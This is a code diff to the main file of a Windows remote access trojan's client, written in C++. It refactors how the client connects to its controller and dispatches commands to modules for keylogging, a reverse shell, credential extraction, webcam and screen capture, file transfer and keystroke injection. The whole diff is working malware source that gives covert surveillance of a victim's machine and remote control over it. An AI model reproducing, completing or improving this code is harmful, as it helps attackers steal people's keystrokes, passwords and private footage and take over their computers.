@@ -8,8 +8,6 @@
 #include "Stream.h"
 #include "Download.h"
 #include "FileManager.h"
-#include "SystemInformation.h"
-#include "NetworkInformation.h"
 #include "ReverseShell.h"
 #include "KeyboardExecuter.h"
 #include "Permission.h"
@@ -23,6 +21,7 @@
 #include "json.hpp"
 #include "CredentialsExtractor.h"
 #include "ConnectionState.h"
+#include "Information.h"
 
 
 std::map<std::string, std::shared_ptr<Stream>> connections;
@@ -96,80 +95,66 @@ bool generate_sockets() {
     return true;
 }
 
+void closeSockets(){
+    for (const auto& [key, value] : connections) {
+        closesocket(value->getSock());
+    }
+}
+
 
 int main(int argc = 0, char *argv[] = nullptr) {
     Sleep(argc);
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
     if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
-//#ifdef KEYLOGGER_DEF
-        KeyLogger keyLogger(Stream(0));
+        std::unordered_map<std::string, std::function<void(nlohmann::json &)>> actionMap;
+        KeyLogger keyLogger(Stream(0), actionMap);
         keyLogger.tryStart();
-//#endif
         //Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
         bool isConnecting = true;
         bool streamListening = true;
         while (isConnecting) {
             nlohmann::json jsonObject;
             std::cout << "trying to connect " << std::endl;
-            generate_sockets();
-            ThreadGen threadGen;
-            Stream stream = *get_connection("FILE_MANAGER");
-            FileManager fileManager(stream);
-            stream = *get_connection("DOWNLOAD_UPLOAD");
-            Download download(stream);
-            stream = *get_connection("REVERSE_SHELL");
-            ReverseShell reverseShell(stream);
-            stream = *get_connection("KEYLOGGER");
-            keyLogger.setStream(stream);
-            stream = *get_connection("PERMISSION");
-            Permission permission(stream);
-            stream = *get_connection("WEBCAM");
-            DeviceEnumerator deviceEnumerator(stream);
-            WebcamManager webcamManager(stream);
-            stream = *get_connection("SCREEN");
-            Stream altStream = *get_connection("SCREEN_EVENT");
-            ScreenStreamer screenStreamer(stream, altStream);
-            stream = *get_connection("CREDENTIALS");
-            CredentialsExtractor credentialsExtractor(stream);
-            stream = *get_connection("MAIN");
-            MessageBoxGUI messageBoxGUI(stream);
-            KeyboardExecuter keyboardExecuter(stream);
-            SystemInformation sysInfo(stream);
-            NetworkInformation networkInfo(stream);
-            ConnectionState connectionState(stream, isConnecting,streamListening);
-
-
-            std::unordered_map<std::string, std::function<void(nlohmann::json &)>> actionMap;
-            actionMap["CONN_STATE"] = [&](nlohmann::json &json) { connectionState.managerMenu(json); };
-            actionMap["FILE_MANAGER"] = [&](nlohmann::json &json) { fileManager.managerMenu(json); };
-            actionMap["SYSTEM_INFORMATION"] = [&](nlohmann::json &json) { sysInfo.send(); };
-            actionMap["NETWORK_INFORMATION"] = [&](nlohmann::json &json) { networkInfo.send(); };
-            actionMap["KEYLOGGER"] = [&](nlohmann::json &json) { keyLogger.managerMenu(json); };
-            actionMap["UP_DO_LOADER"] = [&](nlohmann::json &json) { download.managerMenu(json); };
-            actionMap["REVERSE_SHELL"] = [&](nlohmann::json &json) { reverseShell.managerMenu(json); };
-            actionMap["CREDENTIALS"] = [&](nlohmann::json &json) { credentialsExtractor.managerMenu(json); };
-            actionMap["WEBCAM"] = [&](nlohmann::json &json) { webcamManager.managerMenu(json); };
-            actionMap["SCREEN"] = [&](nlohmann::json &json) { screenStreamer.managerMenu(json); };
-            actionMap["DEV_ENUM"] = [&](nlohmann::json &json) { deviceEnumerator.managerMenu(json); };
-            actionMap["KEYBOARD"] = [&](nlohmann::json &json) { keyboardExecuter.managerMenu(json); };
-            actionMap["PERMISSION"] = [&](nlohmann::json &json) { permission.managerMenu(json); };
-            actionMap["BOX_MESSAGE"] = [&](nlohmann::json &json) { messageBoxGUI.managerMenu(json); };
-            actionMap["SYSTEM_STATE"] = [&](nlohmann::json &json) { SystemState::setState(json); };
-
-            while (streamListening) {
-                jsonObject = nlohmann::json::parse(stream.readString());
-                std::string action = jsonObject["SECTOR"];
-                std::cout << "Sector: " << action << std::endl;
-                auto it = actionMap.find(action);
-                if (it != actionMap.end()) {
-                    it->second(jsonObject);
-                } else {
-                    std::cout << "SECTOR NOT FOUND :(" << std::endl;
+            if (generate_sockets()) {
+                Stream stream = *get_connection("FILE_MANAGER");
+                FileManager(stream, actionMap);
+                stream = *get_connection("DOWNLOAD_UPLOAD");
+                Download(stream, actionMap);
+                stream = *get_connection("REVERSE_SHELL");
+                ReverseShell reverseShell(stream, actionMap);
+                stream = *get_connection("KEYLOGGER");
+                keyLogger.setStream(stream);
+                stream = *get_connection("PERMISSION");
+                Permission(stream, actionMap);
+                stream = *get_connection("WEBCAM");
+                DeviceEnumerator(stream, actionMap);
+                WebcamManager webcamManager(stream, actionMap);
+                stream = *get_connection("SCREEN");
+                Stream altStream = *get_connection("SCREEN_EVENT");
+                ScreenStreamer screenStreamer(stream, altStream, actionMap);
+                stream = *get_connection("CREDENTIALS");
+                CredentialsExtractor(stream, actionMap);
+                stream = *get_connection("MAIN");
+                MessageBoxGUI messageBoxGUI(stream, actionMap);
+                KeyboardExecuter keyboardExecuter(stream, actionMap);
+                Information(stream, actionMap);
+                ConnectionState(stream, actionMap, isConnecting, streamListening);
+                SystemState(stream, actionMap);
+                stream.sendString("ACK");
+                while (streamListening) {
+                    jsonObject = nlohmann::json::parse(stream.readString());
+                    std::string action = jsonObject["ACTION"];
+                    std::cout << "Action: " << action << std::endl;
+                    auto it = actionMap.find(action);
+                    if (it != actionMap.end()) {
+                        it->second(jsonObject);
+                    } else {
+                        std::cout << "ACTION NOT FOUND :(" << std::endl;
+                    }
                 }
+                closeSockets();
+                WSACleanup();
             }
-            // TODO FIX CLOSING
-            //closesocket(sock);
-            WSACleanup();
             std::this_thread::sleep_for(std::chrono::milliseconds(TIMING_RETRY));
         }
     }
